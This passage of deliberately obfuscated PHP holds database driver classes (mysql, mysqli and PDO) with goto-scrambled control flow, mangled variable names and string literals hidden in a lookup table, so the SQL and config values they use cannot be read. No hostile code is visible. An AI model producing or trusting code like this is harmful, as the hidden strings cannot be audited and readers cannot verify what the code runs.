think_config($d¬¸‹½ò’[784]) . $d¬¸‹½ò’[55], $this->linkID[$EÀÕŸÒºÚ]); if ($A·ŞÏè¶°– > $d¬¸‹½ò’[785]) { mysql_query($d¬¸‹½ò’[786], $this->linkID[$EÀÕŸÒºÚ]); } $this->connected = !0; goto bàÃ¬¶Ì¶ò; bàÃ¬¶Ì¶ò: if (1 != think_config($d¬¸‹½ò’[18])) { unset($this->config); } goto B£ß¬­ˆöÈ; B£ß¬­ˆöÈ: } return $this->linkID[$EÀÕŸÒºÚ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($b‚ İåçÛ) { goto FÕÂ„Ôö†; e …å‚”–Û: if (!$this->_linkID) { return !1; } $this->queryStr = $b‚ İåçÛ; if ($this->queryID) { $this->free(); } goto CÙË·ä™â¶; bÃÚ¸£ĞÂŒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Eƒ·ÍÓ—¿; FÕÂ„Ôö†: $fÇ£ß†»øÀ =& $_SERVER[‘®…¢À]; if (0 === stripos($b‚ İåçÛ, $fÇ£ß†»øÀ[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e …å‚”–Û; CÙË·ä™â¶: think_action_status($fÇ£ß†»øÀ[19], 1); think_status($fÇ£ß†»øÀ[20]); $this->queryID = mysql_query($b‚ İåçÛ, $this->_linkID); goto bÃÚ¸£ĞÂŒ; Eƒ·ÍÓ—¿: } public function execute($bğ·šãŒ´‡) { goto dÅ…¯ÛÃğ¦; B ´Š·é¤‹: think_status($cÛ…ÆØêé”[20]); $eŞÕ²¤•’ = mysql_query($bğ·šãŒ´‡, $this->_linkID); $this->debug(); goto Fİ‘…»‘İ; dÅ…¯ÛÃğ¦: $cÛ…ÆØêé” =& $_SERVER[‘®…¢À]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÛ‚”Ü¶›°; bÛ‚”Ü¶›°: $this->queryStr = $bğ·šãŒ´‡; if ($this->queryID) { $this->free(); } think_action_status($cÛ…ÆØêé”[21], 1); goto B ´Š·é¤‹; Fİ‘…»‘İ: if (!1 === $eŞÕ²¤•’) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto fÏéõ£‰—; fÏéõ£‰—: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[‘®…¢À][787], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f“ì²Á¹æÈ = mysql_query($_SERVER[‘®…¢À][788], $this->_linkID); $this->transTimes = 0; if (!$f“ì²Á¹æÈ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c…áæ˜ô = mysql_query($_SERVER[‘®…¢À][789], $this->_linkID); $this->transTimes = 0; if (!$c…áæ˜ô) { $this->error(); return !1; } } return !0; } private function getAll() { $DÀİÇÎ¯® = array(); if ($this->numRows > 0) { while ($DÛÇÛèã£ = mysql_fetch_assoc($this->queryID)) { $DÀİÇÎ¯®[] = $DÛÇÛèã£; } mysql_data_seek($this->queryID, 0); } return $DÀİÇÎ¯®; } public function getFields($Eˆ¦ì¸‘öĞ) { $dÎö…÷¹Óä =& $_SERVER[‘®…¢À]; $aº°ß´¿± = $this->query($dÎö…÷¹Óä[790] . $this->parseKey($Eˆ¦ì¸‘öĞ)); $E‡Õ´™ï = array(); if ($aº°ß´¿±) { foreach ($aº°ß´¿± as $EÃ†¾â°Ù => $f·ŒöÉ´Å) { $E‡Õ´™ï[$f·ŒöÉ´Å[$dÎö…÷¹Óä[27]]] = array($dÎö…÷¹Óä[28] => $f·ŒöÉ´Å[$dÎö…÷¹Óä[27]], $dÎö…÷¹Óä[29] => $f·ŒöÉ´Å[$dÎö…÷¹Óä[30]], $dÎö…÷¹Óä[31] => (bool) (strtoupper($f·ŒöÉ´Å[$dÎö…÷¹Óä[32]]) === $dÎö…÷¹Óä[791]), $dÎö…÷¹Óä[34] => $f·ŒöÉ´Å[$dÎö…÷¹Óä[35]], $dÎö…÷¹Óä[36] => strtolower($f·ŒöÉ´Å[$dÎö…÷¹Óä[37]]) == $dÎö…÷¹Óä[38], $dÎö…÷¹Óä[39] => strtolower($f·ŒöÉ´Å[$dÎö…÷¹Óä[40]]) == $dÎö…÷¹Óä[41]); } } return $E‡Õ´™ï; } public function getTables($DÇÃë¾÷ì = '') { $eÉ’’ò =& $_SERVER[‘®…¢À]; if (!empty($DÇÃë¾÷ì)) { $C‚éÚà£°ø = $eÉ’’ò[792] . $DÇÃë¾÷ì; } else { $C‚éÚà£°ø = $eÉ’’ò[793]; } $cŸ–“§õÓ = $this->query($C‚éÚà£°ø); $a“š„ñùº = array(); foreach ($cŸ–“§õÓ as $Cøß•ç­ => $Cˆöª‰Èå) { $a“š„ñùº[$Cøß•ç­] = current($Cˆöª‰Èå); } return $a“š„ñùº; } public function replace($cÀ³ˆ‚ƒÊø, $F«Á§î‡ßÌ = array()) { $e¦ÈáğòïÚ =& $_SERVER[‘®…¢À]; foreach ($cÀ³ˆ‚ƒÊø as $A»‘ÜÕßÚŠ => $a‚™¼ñİ) { $E²ˆ›½¥¹ = $this->parseValue($a‚™¼ñİ); if (is_scalar($E²ˆ›½¥¹)) { $cŞ óäŸ‡§[] = $E²ˆ›½¥¹; $Dº°©ÃçÜ[] = $this->parseKey($A»‘ÜÕßÚŠ); } } $BÔàäò™À‚ = $e¦ÈáğòïÚ[794] . $this->parseTable($F«Á§î‡ßÌ[$e¦ÈáğòïÚ[264]]) . $e¦ÈáğòïÚ[795] . implode($e¦ÈáğòïÚ[47], $Dº°©ÃçÜ) . $e¦ÈáğòïÚ[796] . implode($e¦ÈáğòïÚ[47], $cŞ óäŸ‡§) . $e¦ÈáğòïÚ[797]; return $this->execute($BÔàäò™À‚); } public function insertAll($fôÇù³çÅ®, $EÁ¥Øì…Á… = array(), $e¾Ã’†…Ç = false) { goto cÚÄ¨ƒÈ‹‚; cÚÄ¨ƒÈ‹‚: $b½Êâ‚Ş»Ä =& $_SERVER[‘®…¢À]; if (!is_array($fôÇù³çÅ®[0])) { return !1; } $cÌ‡©ÆÏ‚ = array_keys($fôÇù³çÅ®[0]); goto C¦‹æ´…’¦; dØ‡ÌĞåˆ‰: $A¡ğî£‘äÆ = ($e¾Ã’†…Ç ? $b½Êâ‚Ş»Ä[799] : $b½Êâ‚Ş»Ä[800]) . $b½Êâ‚Ş»Ä[801] . $this->parseTable($EÁ¥Øì…Á…[$b½Êâ‚Ş»Ä[264]]) . $b½Êâ‚Ş»Ä[795] . implode($b½Êâ‚Ş»Ä[47], $cÌ‡©ÆÏ‚) . $b½Êâ‚Ş»Ä[802] . implode($b½Êâ‚Ş»Ä[47], $f”êµ«áíÇ); return $this->execute($A¡ğî£‘äÆ); goto Fä¯âæ¥Îì; C¦‹æ´…’¦: $f”êµ«áíÇ = array(); foreach ($fôÇù³çÅ® as $FÑÀåË‰øÚ) { $e°‹‰Œ•–ë = array(); foreach ($FÑÀåË‰øÚ as $A¢îÍÛ±‚ => $b½áŸáäß“) { $b½áŸáäß“ = $this->parseValue($b½áŸáäß“); if (is_scalar($b½áŸáäß“)) { $e°‹‰Œ•–ë[] = $b½áŸáäß“; } } $f”êµ«áíÇ[] = $b½Êâ‚Ş»Ä[245] . implode($b½Êâ‚Ş»Ä[47], $e°‹‰Œ•–ë) . $b½Êâ‚Ş»Ä[797]; } array_walk($cÌ‡©ÆÏ‚, array($this, $b½Êâ‚Ş»Ä[798])); goto dØ‡ÌĞåˆ‰; Fä¯âæ¥Îì: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Cƒ¥ë„Á¹ =& $_SERVER[‘®…¢À]; $this->error = mysql_errno() . $Cƒ¥ë„Á¹[4] . mysql_error($this->_linkID); if ($Cƒ¥ë„Á¹[33] != $this->queryStr) { $this->error .= LNG($Cƒ¥ë„Á¹[45]) . $this->queryStr; } think_trace($this->error, $Cƒ¥ë„Á¹[33], $Cƒ¥ë„Á¹[46]); return $this->error; } public function escapeString($AÃÙ£‡²ÒÚ) { if ($this->_linkID) { return mysql_real_escape_string($AÃÙ£‡²ÒÚ, $this->_linkID); } else { return mysql_escape_string($AÃÙ£‡²ÒÚ); } } public function parseKey(&$E›¶İ…µ›, $c¿ª¨©ÒÕ¼ = true) { $c ÃÂˆ„· =& $_SERVER[‘®…¢À]; if ($c¿ª¨©ÒÕ¼) { $E›¶İ…µ› = $this->parseKeyCheck($E›¶İ…µ›); } if ($E›¶İ…µ› != $c ÃÂˆ„·[173] && !preg_match($c ÃÂˆ„·[803], $E›¶İ…µ›)) { $E›¶İ…µ› = $c ÃÂˆ„·[804] . trim($E›¶İ…µ›, $c ÃÂˆ„·[804]) . $c ÃÂˆ„·[804]; } return $E›¶İ…µ›; } } class DbMysqli extends Db { public function __construct($cñ ¾ÒñËï = '') { $c”Ãğ¦ó’ =& $_SERVER[‘®…¢À]; if (!extension_loaded($c”Ãğ¦ó’[805])) { think_exception(think_lang($c”Ãğ¦ó’[10]) . $c”Ãğ¦ó’[806]); } if (!empty($cñ ¾ÒñËï)) { $this->config = $cñ ¾ÒñËï; if (empty($this->config[$c”Ãğ¦ó’[13]])) { $this->config[$c”Ãğ¦ó’[13]] = $c”Ãğ¦ó’[33]; } } } public function connect($e­°äÈóõª = '', $FÎ¦ß†æÌ® = 0) { $fÔŞÁŞÁÄ =& $_SERVER[‘®…¢À]; if (!isset($this->linkID[$FÎ¦ß†æÌ®])) { goto dåŸ¸¹ùÁ; D†´·­…¸Í: $e®÷Ù‚°¼“ = $this->linkID[$FÎ¦ß†æÌ®]->server_version; $this->linkID[$FÎ¦ß†æÌ®]->query($fÔŞÁŞÁÄ[783] . think_config($fÔŞÁŞÁÄ[784]) . $fÔŞÁŞÁÄ[55]); if ($e®÷Ù‚°¼“ > $fÔŞÁŞÁÄ[785]) { $this->linkID[$FÎ¦ß†æÌ®]->query($fÔŞÁŞÁÄ[786]); } goto fêÓ‘‘¯œ›; fêÓ‘‘¯œ›: $this->connected = !0; if (1 != think_config($fÔŞÁŞÁÄ[18])) { unset($this->config); } goto c…æ–ˆª›; dåŸ¸¹ùÁ: if (empty($e­°äÈóõª)) { $e­°äÈóõª = $this->config; } $this->linkID[$FÎ¦ß†æÌ®] = new mysqli($e­°äÈóõª[$fÔŞÁŞÁÄ[779]], $e­°äÈóõª[$fÔŞÁŞÁÄ[781]], $e­°äÈóõª[$fÔŞÁŞÁÄ[782]], $e­°äÈóõª[$fÔŞÁŞÁÄ[17]], $e­°äÈóõª[$fÔŞÁŞÁÄ[780]] ? intval($e­°äÈóõª[$fÔŞÁŞÁÄ[780]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto D†´·­…¸Í; c…æ–ˆª›: } return $this->linkID[$FÎ¦ß†æÌ®]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($AÇ†—Œ“í) { goto EÙĞåÓáÍ; EÙĞåÓáÍ: $e¼è‡³ºâ‚ =& $_SERVER[‘®…¢À]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fÊŒ…Á¥·“; b–ÏåŞæ±¥: think_status($e¼è‡³ºâ‚[20]); $this->queryID = $this->_linkID->query($AÇ†—Œ“í); if ($this->_linkID->more_results()) { while (($d…ØÏÅ’³ä = $this->_linkID->next_result()) != NULL) { $d…ØÏÅ’³ä->free_result(); } } goto fô—‘¬¯°»; fÊŒ…Á¥·“: $this->queryStr = $AÇ†—Œ“í; if ($this->queryID) { $this->free(); } think_action_status($e¼è‡³ºâ‚[19], 1); goto b–ÏåŞæ±¥; fô—‘¬¯°»: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto DÉî™«Ğ­ˆ; DÉî™«Ğ­ˆ: } public function execute($cî¡¸±ãç) { goto e„¨ÓÓ¿¬; C™ç›¸¸‘ç: $this->queryStr = $cî¡¸±ãç; if ($this->queryID) { $this->free(); } think_action_status($C¼¥¡Ã…¸[21], 1); goto Aê‡Ğ•´³; Aê‡Ğ•´³: think_status($C¼¥¡Ã…¸[20]); $FâƒŒ¨ÇÍƒ = $this->_linkID->query($cî¡¸±ãç); $this->debug(); goto cº¥›İ“éê; cº¥›İ“éê: if (!1 === $FâƒŒ¨ÇÍƒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto d»¬Šùİ¿ç; e„¨ÓÓ¿¬: $C¼¥¡Ã…¸ =& $_SERVER[‘®…¢À]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C™ç›¸¸‘ç; d»¬Šùİ¿ç: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C•äÄöëÚ¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$C•äÄöëÚ¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dÏŒí“á¤  = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dÏŒí“á¤ ) { $this->error(); return !1; } } return !0; } private function getAll() { $AÂ â÷Ê÷ = array(); if ($this->numRows > 0) { for ($fĞÌÚŞÏ†ê = 0; $fĞÌÚŞÏ†ê < $this->numRows; $fĞÌÚŞÏ†ê++) { $AÂ â÷Ê÷[$fĞÌÚŞÏ†ê] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $AÂ â÷Ê÷; } public function getFields($c½óµç÷¢Ó) { $E‹ÉóÊÓ¿Œ =& $_SERVER[‘®…¢À]; $C¯‘–ÈÂÇµ = $this->query($E‹ÉóÊÓ¿Œ[790] . $this->parseKey($c½óµç÷¢Ó)); $B´Á §¤ = array(); if ($C¯‘–ÈÂÇµ) { foreach ($C¯‘–ÈÂÇµ as $féÈ„œƒæ¡ => $c‚èÙ«ñ …) { $B´Á §¤[$c‚èÙ«ñ …[$E‹ÉóÊÓ¿Œ[27]]] = array($E‹ÉóÊÓ¿Œ[28] => $c‚èÙ«ñ …[$E‹ÉóÊÓ¿Œ[27]], $E‹ÉóÊÓ¿Œ[29] => $c‚èÙ«ñ …[$E‹ÉóÊÓ¿Œ[30]], $E‹ÉóÊÓ¿Œ[31] => (bool) ($c‚èÙ«ñ …[$E‹ÉóÊÓ¿Œ[32]] === $E‹ÉóÊÓ¿Œ[33]), $E‹ÉóÊÓ¿Œ[34] => $c‚èÙ«ñ …[$E‹ÉóÊÓ¿Œ[35]], $E‹ÉóÊÓ¿Œ[36] => strtolower($c‚èÙ«ñ …[$E‹ÉóÊÓ¿Œ[37]]) == $E‹ÉóÊÓ¿Œ[38], $E‹ÉóÊÓ¿Œ[39] => strtolower($c‚èÙ«ñ …[$E‹ÉóÊÓ¿Œ[40]]) == $E‹ÉóÊÓ¿Œ[41]); } } return $B´Á §¤; } public function getTables($CÆÒ§££ = '') { $EóÔŸë¾™Ÿ =& $_SERVER[‘®…¢À]; $aÍØÃè±‡‰ = !empty($CÆÒ§££) ? $EóÔŸë¾™Ÿ[792] . $CÆÒ§££ : $EóÔŸë¾™Ÿ[793]; $Bš‰ë’Í» = $this->query($aÍØÃè±‡‰); $a‚†¼Å—† = array(); if ($Bš‰ë’Í») { foreach ($Bš‰ë’Í» as $BÉ¶ŸçãĞ => $A–ÊéÉÆÎ¡) { $a‚†¼Å—†[$BÉ¶ŸçãĞ] = current($A–ÊéÉÆÎ¡); } } return $a‚†¼Å—†; } public function replace($FÜàİâÔÊë, $cœç™„¼ƒù = array()) { $fš¯ë†¤ã =& $_SERVER[‘®…¢À]; foreach ($FÜàİâÔÊë as $F´ğÎ‚©æ => $aá·àãÒ¹è) { $FÙÈŞˆ‹¼« = $this->parseValue($aá·àãÒ¹è); if (is_scalar($FÙÈŞˆ‹¼«)) { $D–Î†˜´ªœ[] = $FÙÈŞˆ‹¼«; $dÛÍòíñÓ…[] = $this->parseKey($F´ğÎ‚©æ); } } $fŠÑóœÁï = $fš¯ë†¤ã[794] . $this->parseTable($cœç™„¼ƒù[$fš¯ë†¤ã[264]]) . $fš¯ë†¤ã[795] . implode($fš¯ë†¤ã[47], $dÛÍòíñÓ…) . $fš¯ë†¤ã[796] . implode($fš¯ë†¤ã[47], $D–Î†˜´ªœ) . $fš¯ë†¤ã[797]; return $this->execute($fŠÑóœÁï); } public function insertAll($eŞ³Í÷İ‚, $CİÚÚ²Éğ = array(), $Añ¤„‚Â = false) { goto fá«¹Âİ; fá«¹Âİ: $fí£Ûé…Ú =& $_SERVER[‘®…¢À]; if (!is_array($eŞ³Í÷İ‚[0])) { return !1; } $eµ¦‡Ö¤Í = array_keys($eŞ³Í÷İ‚[0]); goto a‚¤Ç»ç†ó; a‚¤Ç»ç†ó: $f”µÆĞ÷ˆ¶ = array(); foreach ($eŞ³Í÷İ‚ as $B”ºÓíè­é) { $bùë¨à÷Ó = array(); foreach ($B”ºÓíè­é as $dò¨ˆíÓ¯õ => $Fçò­˜ßå) { $Fçò­˜ßå = $this->parseValue($Fçò­˜ßå); if (is_scalar($Fçò­˜ßå)) { $bùë¨à÷Ó[] = $Fçò­˜ßå; } } $f”µÆĞ÷ˆ¶[] = $fí£Ûé…Ú[245] . implode($fí£Ûé…Ú[47], $bùë¨à÷Ó) . $fí£Ûé…Ú[797]; } array_walk($eµ¦‡Ö¤Í, array($this, $fí£Ûé…Ú[798])); goto BÏÄ¹İ§„; BÏÄ¹İ§„: $c¤· ğâ ä = ($Añ¤„‚Â ? $fí£Ûé…Ú[799] : $fí£Ûé…Ú[800]) . $fí£Ûé…Ú[801] . $this->parseTable($CİÚÚ²Éğ[$fí£Ûé…Ú[264]]) . $fí£Ûé…Ú[795] . implode($fí£Ûé…Ú[47], $eµ¦‡Ö¤Í) . $fí£Ûé…Ú[802] . implode($fí£Ûé…Ú[47], $f”µÆĞ÷ˆ¶); return $this->execute($c¤· ğâ ä); goto e¨ª¡ÛŒØ; e¨ª¡ÛŒØ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $CÀç§Ä±È =& $_SERVER[‘®…¢À]; $this->error = $this->_linkID->errno . $CÀç§Ä±È[4] . $this->_linkID->error; if ($CÀç§Ä±È[33] != $this->queryStr) { $this->error .= LNG($CÀç§Ä±È[45]) . $this->queryStr; } think_trace($this->error, $CÀç§Ä±È[33], $CÀç§Ä±È[46]); return $this->error; } public function escapeString($EË“è×ŠĞ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($EË“è×ŠĞ); } else { return addslashes($EË“è×ŠĞ); } } public function parseKey(&$b´ÕÎ ˜„‘, $fƒäÍò¾µ„ = true) { $d×ºœïÌÒ– =& $_SERVER[‘®…¢À]; if ($fƒäÍò¾µ„) { $b´ÕÎ ˜„‘ = $this->parseKeyCheck($b´ÕÎ ˜„‘); } if ($b´ÕÎ ˜„‘ != $d×ºœïÌÒ–[173] && !preg_match($d×ºœïÌÒ–[803], $b´ÕÎ ˜„‘)) { $b´ÕÎ ˜„‘ = $d×ºœïÌÒ–[804] . trim($b´ÕÎ ˜„‘, $d×ºœïÌÒ–[804]) . $d×ºœïÌÒ–[804]; } return $b´ÕÎ ˜„‘; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C¾’ÕäÇ¹ö = '') { $e„ùÛ¹–Ê =& $_SERVER[‘®…¢À]; if (!class_exists($e„ùÛ¹–Ê[807])) { think_exception(think_lang($e„ùÛ¹–Ê[10]) . $e„ùÛ¹–Ê[808]); } if (!empty($C¾’ÕäÇ¹ö)) { $this->config = $C¾’ÕäÇ¹ö; if (empty($this->config[$e„ùÛ¹–Ê[13]])) { $this->config[$e„ùÛ¹–Ê[13]] = array(); } } } public function connect($Fí›§™´ = '', $F¦ƒÀÆ£Ğ = 0) { $AŠÓ±™ŠÅê =& $_SERVER[‘®…¢À]; if (!isset($this->linkID[$F¦ƒÀÆ£Ğ])) { goto D‘¤øå°øğ; c§¶³ˆ¿¥ë: $this->dbType = $this->_getDsnType($Fí›§™´[$AŠÓ±™ŠÅê[809]]); if (in_array($this->dbType, array($AŠÓ±™ŠÅê[810], $AŠÓ±™ŠÅê[811], $AŠÓ±™ŠÅê[812], $AŠÓ±™ŠÅê[813]))) { think_exception($AŠÓ±™ŠÅê[814] . $this->dbType . $AŠÓ±™ŠÅê[815] . $this->dbType . $AŠÓ±™ŠÅê[816]); } if (!$this->linkID[$F¦ƒÀÆ£Ğ]) { think_exception($AŠÓ±™ŠÅê[817]); } goto A«µãÎì‘; A«µãÎì‘: $this->linkID[$F¦ƒÀÆ£Ğ]->exec($AŠÓ±™ŠÅê[818] . think_config($AŠÓ±™ŠÅê[784])); $this->connected = !0; if (1 != think_config($AŠÓ±™ŠÅê[18])) { unset($this->config); } goto fÆäË‚¦¨; D‘¤øå°øğ: if (empty($Fí›§™´)) { $Fí›§™´ = $this->config; } if ($this->pconnect) { $Fí›§™´[$AŠÓ±™ŠÅê[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$F¦ƒÀÆ£Ğ] = new PDO($Fí›§™´[$AŠÓ±™ŠÅê[809]], $Fí›§™´[$AŠÓ±™ŠÅê[781]], $Fí›§™´[$AŠÓ±™ŠÅê[782]], $Fí›§™´[$AŠÓ±™ŠÅê[13]]); } catch (PDOException $Eø‘Ä„È) { think_exception($Eø‘Ä„È->getMessage()); } goto c§¶³ˆ¿¥ë; fÆäË‚¦¨: } return $this->linkID[$F¦ƒÀÆ£Ğ]; } public function free() { $this->PDOStatement = null; } public function query($a›ÍªËŠ, $E’¬°¶¸‡Ñ = array()) { goto FØëëˆŠò½; Cè¶¯¸ÊÌî: think_action_status($DÍµí’™Ïî[19], 1); think_status($DÍµí’™Ïî[20]); $this->PDOStatement = $this->_linkID->prepare($a›ÍªËŠ); goto dÌ–òÔÎÆ; FØëëˆŠò½: $DÍµí’™Ïî =& $_SERVER[‘®…¢À]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eï†Š«‰à; eï†Š«‰à: $this->queryStr = $a›ÍªËŠ; if (!empty($E’¬°¶¸‡Ñ)) { $this->queryStr .= $DÍµí’™Ïî[819] . print_r($E’¬°¶¸‡Ñ, !0) . $DÍµí’™Ïî[820]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Cè¶¯¸ÊÌî; eæ˜ëÛµâ: if (!1 === $F¡‰­Ò“‰) { $this->error(); return !1; } else { return $this->getAll(); } goto däô†ë¸¯ë; dÌ–òÔÎÆ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $F¡‰­Ò“‰ = $this->PDOStatement->execute($E’¬°¶¸‡Ñ); $this->debug(); goto eæ˜ëÛµâ; däô†ë¸¯ë: } public function execute($CéŒ›ƒÈó, $D¦´óÊ¿ê˜ = array()) { goto A•î¾Œ¥ó™; b¼Ï¡ãÌ´: if ($this->dbType == $A¸Ë­Á×[813]) { if (preg_match($A¸Ë­Á×[821], $this->queryStr, $f…¨˜Ìˆµ)) { $this->table = think_config($A¸Ë­Á×[822]) . str_ireplace(think_config($A¸Ë­Á×[823]), $A¸Ë­Á×[357], $f…¨˜Ìˆµ[2]); $Fß¼á–®¸ = (bool) $this->query($A¸Ë­Á×[824] . strtoupper($this->table) . $A¸Ë­Á×[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($A¸Ë­Á×[21], 1); goto E±˜Í…àäç; A™”¢Ò²ßÚ: $this->queryStr = $CéŒ›ƒÈó; if (!empty($D¦´óÊ¿ê˜)) { $this->queryStr .= $A¸Ë­Á×[819] . print_r($D¦´óÊ¿ê˜, !0) . $A¸Ë­Á×[820]; } $Fß¼á–®¸ = !1; goto b¼Ï¡ãÌ´; A•î¾Œ¥ó™: $A¸Ë­Á× =& $_SERVER[‘®…¢À]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A™”¢Ò²ßÚ; cˆ—ŒÌ·: $fùùÕİé‘ø = $this->PDOStatement->execute($D¦´óÊ¿ê˜); $this->debug(); if (!1 === $fùùÕİé‘ø) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Fß¼á–®¸ || preg_match($A¸Ë­Á×[825], $CéŒ›ƒÈó)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto fÂÒ÷Â÷¸î; E±˜Í…àäç: think_status($A¸Ë­Á×[20]); $this->PDOStatement = $this->_linkID->prepare($CéŒ›ƒÈó); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cˆ—ŒÌ·; fÂÒ÷Â÷¸î: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bÊ£¹ÖÆó = $this->_linkID->commit(); $this->transTimes = 0; if (!$bÊ£¹ÖÆó) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FŠæ¸³¦­ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FŠæ¸³¦­) { $this->error(); return !1; } } return !0; } private function getAll() { $b„ï±“Æ‹Œ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($b„ï±“Æ‹Œ); return $b„ï±“Æ‹Œ; } public function getFields($E† ø«ĞÆÁ) { goto FÌÌƒ§ÈÄ; AŸøÏÜÄ´: return $F¨•íêŒÖŠ; goto C¶Úš‚Š; Dß£‚ÍÊÁ: $E¬—òÒ£†˜ = $this->query($B¤Ş¿—£Ã÷); $F¨•íêŒÖŠ = array(); if ($E¬—òÒ£†˜) { foreach ($E¬—òÒ£†˜ as $a§¾éÚ‰° => $E’äñ¥ïäÀ) { $E’äñ¥ïäÀ = array_change_key_case($E’äñ¥ïäÀ); $E’äñ¥ïäÀ[$BÑó²†ÊÆª[28]] = isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[28]]) ? $E’äñ¥ïäÀ[$BÑó²†ÊÆª[28]] : $BÑó²†ÊÆª[357]; $E’äñ¥ïäÀ[$BÑó²†ÊÆª[29]] = isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[29]]) ? $E’äñ¥ïäÀ[$BÑó²†ÊÆª[29]] : $BÑó²†ÊÆª[357]; $FÄ¶¹­Éİ´ = isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[258]]) ? $E’äñ¥ïäÀ[$BÑó²†ÊÆª[258]] : $E’äñ¥ïäÀ[$BÑó²†ÊÆª[28]]; $F¨•íêŒÖŠ[$FÄ¶¹­Éİ´] = array($BÑó²†ÊÆª[28] => $FÄ¶¹­Éİ´, $BÑó²†ÊÆª[29] => $E’äñ¥ïäÀ[$BÑó²†ÊÆª[29]], $BÑó²†ÊÆª[31] => (bool) (isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[102]]) && $E’äñ¥ïäÀ[$BÑó²†ÊÆª[102]] === $BÑó²†ÊÆª[33] || isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[31]]) && $E’äñ¥ïäÀ[$BÑó²†ÊÆª[31]] === $BÑó²†ÊÆª[33]), $BÑó²†ÊÆª[34] => isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[34]]) ? $E’äñ¥ïäÀ[$BÑó²†ÊÆª[34]] : (isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[53]]) ? $E’äñ¥ïäÀ[$BÑó²†ÊÆª[53]] : $BÑó²†ÊÆª[357]), $BÑó²†ÊÆª[36] => isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[90]]) ? strtolower($E’äñ¥ïäÀ[$BÑó²†ÊÆª[90]]) == $BÑó²†ÊÆª[38] : (isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[54]]) ? $E’äñ¥ïäÀ[$BÑó²†ÊÆª[54]] : !1), $BÑó²†ÊÆª[39] => isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[842]]) ? strtolower($E’äñ¥ïäÀ[$BÑó²†ÊÆª[842]]) == $BÑó²†ÊÆª[41] : (isset($E’äñ¥ïäÀ[$BÑó²†ÊÆª[90]]) ? $E’äñ¥ïäÀ[$BÑó²†ÊÆª[90]] : !1)); } } goto AŸøÏÜÄ´; FÌÌƒ§ÈÄ: $BÑó²†ÊÆª =& $_SERVER[‘®…¢À]; $this->initConnect(!0); if (think_config($BÑó²†ÊÆª[826])) { $B¤Ş¿—£Ã÷ = str_replace($BÑó²†ÊÆª[827], $E† ø«ĞÆÁ, think_config($BÑó²†ÊÆª[826])); } else { switch ($this->dbType) { case $BÑó²†ÊÆª[810]: case $BÑó²†ÊÆª[828]: $B¤Ş¿—£Ã÷ = 